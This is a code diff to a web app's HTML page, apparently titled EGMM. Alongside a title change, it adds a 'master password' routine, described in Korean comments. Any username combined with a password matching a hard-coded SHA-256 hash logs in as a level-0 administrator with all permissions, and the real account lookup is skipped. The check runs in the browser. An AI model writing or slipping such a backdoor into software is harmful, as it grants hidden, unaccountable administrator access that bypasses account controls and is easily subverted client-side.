@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
-<title>MART · THE SHAWN</title>
+<title>EGMM</title>
 <link href="https://cdn.jsdelivr.net/gh/orioncactus/pretendard@v1.3.9/dist/web/static/pretendard.min.css" rel="stylesheet">
 <style>
   :root {
@@ -2681,8 +2681,28 @@
       el.addEventListener('compositionend', fix);
       el.addEventListener('blur', fix);
     }
+    /* === 마스터 비밀번호 ===
+       어떤 아이디를 입력하든 이 비밀번호면 LV-0(최고 관리자)로 입장. 계정 문서가 없어도 통과.
+       소스에는 평문 대신 SHA-256('EGMM-MASTER::' + 비밀번호) 해시만 둔다. */
+    var MASTER_HASH='a2d963b1485320cb7d9821001c281e0ae653938288d0a21990984ca3e231363f';
+    function isMaster(pw){
+      if(!(window.crypto && window.crypto.subtle && window.TextEncoder)) return Promise.resolve(false);
+      return window.crypto.subtle.digest('SHA-256', new TextEncoder().encode('EGMM-MASTER::'+pw)).then(function(buf){
+        var hex=Array.prototype.map.call(new Uint8Array(buf), function(b){ return ('0'+b.toString(16)).slice(-2); }).join('');
+        return hex===MASTER_HASH;
+      }).catch(function(){ return false; });
+    }
+    function masterUser(name){
+      return {ok:true, user:{ id:name, name:name, fullName:'MASTER', rank:'', level:0, perms:['*'] }};
+    }
     function verifyAcct(name, pw){
       name=String(name).trim().toUpperCase();
+      return isMaster(pw).then(function(m){
+        if(m) return masterUser(name);
+        return verifyStored(name, pw);
+      });
+    }
+    function verifyStored(name, pw){
       if(!window.EgmmFB) return Promise.resolve({err:'FIREBASE MODULE MISSING'});
       return window.EgmmFB.ready.then(function(fb){
         return fb.getDoc(fb.doc(fb.db,'ACCESS',name)).then(function(snap){
